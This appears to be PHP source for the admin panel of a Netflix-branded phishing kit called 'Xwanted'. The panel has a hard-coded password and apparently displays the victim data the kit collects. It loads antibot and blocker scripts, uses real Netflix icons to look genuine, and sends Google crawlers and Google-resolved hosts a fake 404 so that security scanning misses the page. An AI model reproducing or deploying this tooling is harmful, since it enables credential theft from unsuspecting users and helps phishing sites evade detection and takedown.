<?php
session_start();
$passwd = "xwanted"; //EDIT YOUR FUCKING PASSWORD BRO
$form = "
<!DOCTYPE html>
<html>
<head>
	<title>Admin Panel</title>
	<link rel='shortcut icon' href='https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico'/>
	<meta charset='utf-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1.0'>
	<link rel='stylesheet' type='text/css' href='data/style.css'>
<body>
<form action='' method='post'>
<center>
<div id='admin-panel'>
	<div id='admin-top-bar'>
		<img src='data/flix.png' id='admin-top-img'>
	</div>
	<div id='admin_container'>
		<h2 id='admin-h2'>Welcome to Admin Panel</h2>
	</div>
	<input type='password' name='pass' placeholder='Enter your password' id='admin-input' style='width: 85%;'>
	<button name='btn' class='rz-btn' style='margin-bottom: 50px;width: 85%;'>LOGIN</button>
	<div id='admin-bottom-bar'>
		<img src='data/nficon2016.png' id='admin-bottom-img'>
	</div>
</div>
</center>
</form>
</body>
</html>
";
if (isset($_POST['btn'])) {
	$pass = $_POST['pass'];
	if ($pass == $passwd) {
		$_SESSION['xlg'] = true;
	}else{
		$_SESSION['xlg'] = false;
		die("{$form} <script type='text/javascript'>alert('Wrong Password !');</script>");
	}
}
if ($_SESSION['xlg'] == false) {
	echo $form;
	exit();
}
?>
<?php
session_start();
error_reporting(0);

include "../boots/antibots1.php";
include "../boots/antibots2.php";
include "../boots/antibots3.php";
include "../boots/antibots4.php";
include "../boots/encriptar.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("../Xwanted/system/blocker.php");
include("../Xwanted/system/detect.php");
?>
<!DOCTYPE html>
<html>
<head>
	<title>Admin Panel</title>
	<link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="data/style.css">
<body>
<center>
<div id="admin-panel">
	<div id="admin-top-bar">
		<img src="data/flix.png" id="admin-top-img">
	</div>
	<div id='admin_container'>
		<h2 id='admin-fucking-h2'>Welcome to Admin Panel</h2>
	</div>
	<div id="admin-content">
	<?php include 'data/data.php'; ?>
	</div>
	<div id="admin-bottom-bar">
		<img src="data/nficon2016.png" id="admin-bottom-img">
	</div>
</div>

</center>
</body>
</html>